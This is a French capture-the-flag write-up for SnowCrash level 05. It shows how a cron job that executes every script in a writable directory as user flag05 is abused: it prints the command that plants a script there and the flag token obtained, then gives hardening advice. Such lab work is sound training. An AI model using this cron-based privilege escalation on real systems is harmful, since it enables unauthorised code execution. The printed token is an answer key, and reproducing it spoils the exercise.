## SnowCrash - Level 05 - Exploitation de Tâche Planifiée (Cron Job)

### 1. Identification de la piste

En explorant le système, un fichier est trouvé dans le répertoire des mails locaux : `/var/mail/level05`. Ce fichier contient une ligne de configuration de type **crontab** :

```bash
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

```

**Analyse de la ligne :**

* `*/2 * * * *` : La tâche s'exécute automatiquement **toutes les 2 minutes**.
* `su -c "..." - flag05` : La commande est exécutée avec les privilèges de l'utilisateur **flag05**.
* `sh /usr/sbin/openarenaserver` : Le script lancé est `/usr/sbin/openarenaserver`.

### 2. Analyse du script vulnérable

L'examen du contenu de `/usr/sbin/openarenaserver` révèle une logique de traitement par lot (batch processing) :

```bash
#!/bin/sh

for i in /opt/openarenaserver/* ; do
    (ulimit -t 5; sh "$i")
    rm -f "$i"
done

```

**Fonctionnement :**

1. Le script parcourt tous les fichiers présents dans le dossier `/opt/openarenaserver/`.
2. Il exécute chaque fichier trouvé en tant que script shell (`sh "$i"`).
3. Une fois l'exécution terminée, il supprime le fichier (`rm -f "$i"`).

**La faille :** N'importe quel utilisateur ayant le droit d'écrire dans `/opt/openarenaserver/` peut y déposer un script. Ce script sera ensuite exécuté par l'utilisateur `flag05` via la tâche cron.

### 3. Stratégie d'exploitation

L'objectif est de faire exécuter la commande `getflag` par `flag05` et de récupérer la sortie dans un fichier lisible par notre utilisateur `level05`.

**Étapes de l'attaque :**

1. Créer un script shell dans le répertoire surveillé.
2. Lui donner les droits d'exécution.
3. Attendre que le démon `cron` déclenche le passage du script `/usr/sbin/openarenaserver`.

### 4. Mise en œuvre

```bash
# 1. Création du script d'attaque
echo "getflag > /tmp/solution" > /opt/openarenaserver/exploit.sh

# 2. Attribution des permissions d'exécution
chmod +x /opt/openarenaserver/exploit.sh

# 3. Attente (max 2 minutes)
# On surveille l'apparition du fichier de sortie
ls -l /tmp/solution

```

Une fois le fichier `/opt/openarenaserver/exploit.sh` disparu (supprimé par le nettoyeur), le résultat est disponible :

```bash
cat /tmp/solution
Check flag.Here is your token : viuaaale9huek52boumoomioc

```

### 5. Conclusion et Sécurisation

Ce niveau démontre un vecteur d'attaque classique : l'**exécution de code arbitraire** via un dossier partagé.

**Recommandations de sécurité :**

* **Principe du moindre privilège :** Ne jamais faire exécuter des scripts provenant d'un répertoire où des utilisateurs non privilégiés ont des droits d'écriture.
* **Contrôle d'accès :** Restreindre les permissions du dossier `/opt/openarenaserver/` pour que seul le propriétaire puisse y ajouter des fichiers.
* **Validation :** Si un tel système est nécessaire, le script devrait valider l'intégrité ou la signature des fichiers avant exécution.

